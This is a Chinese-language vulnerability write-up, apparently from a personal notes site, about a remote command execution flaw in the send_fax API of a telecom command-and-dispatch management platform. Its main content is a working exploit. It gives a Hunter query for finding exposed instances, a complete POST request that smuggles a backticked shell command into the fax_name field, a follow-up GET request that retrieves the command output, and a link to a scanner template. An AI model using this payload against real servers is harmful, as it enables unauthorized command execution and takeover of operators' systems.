# 指挥调度平台send_fax存在远程命令执行漏洞

# 一、漏洞简介
<font style="color:rgb(51, 51, 51);">指挥调度管理平台是一个专业针对通信行业的管理平台。该产品旨在提供高效的指挥调度喝管理解决方案，以帮助通信运营商或相关机构实现更好的运营效率和服务质量。该平台提供强大的指挥调度功能，可以实时监控和管理通信网络设备、维护人员和工作任务等。用户可以通过该平台发送指令、调度人员、分配任务。指挥调度平台send_fax存在远程命令执行漏洞，攻击者可通过该漏洞获取服务器权限。</font>

# <font style="color:rgb(51, 51, 51);">三、资产测绘</font>
+ <font style="color:rgb(51, 51, 51);">hunter</font>`<font style="color:rgb(51, 51, 51);">web.body="app/structure/departments.php"</font>`
+ <font style="color:rgb(51, 51, 51);">特征</font>

![1701096622884-9c34ec74-7f59-464c-b435-5a6ccd465c74.png](./img/ObPXNwJRo2S4XdO_/1701096622884-9c34ec74-7f59-464c-b435-5a6ccd465c74-954994.png)

# <font style="color:rgb(51, 51, 51);">四、漏洞复现</font>
```plain
POST /api/client/fax/send_fax.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Content-Length: 29
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1

fax_name=`whoami > 1.txt`.pdf
```

![1706073841954-f6338ebb-177f-401c-b470-20545bad6ec1.png](./img/ObPXNwJRo2S4XdO_/1706073841954-f6338ebb-177f-401c-b470-20545bad6ec1-509394.png)

获取命令执行结果

```plain
GET /api/client/fax/1.txt HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=9d162ed31bcb785f6f5cb1fcc92dfff2
Upgrade-Insecure-Requests: 1
```

![1706073883647-6d19d499-6d63-4239-b337-f757006f5d16.png](./img/ObPXNwJRo2S4XdO_/1706073883647-6d19d499-6d63-4239-b337-f757006f5d16-090767.png)

[福建科立讯通信-指挥调度平台-send-fax-远程命令执行.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222143771-9a0b3a4a-d028-4593-a184-ee7c7d7dad61.yaml)



> 更新: 2024-02-29 23:55:44  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ficwasc2nrssf2yb>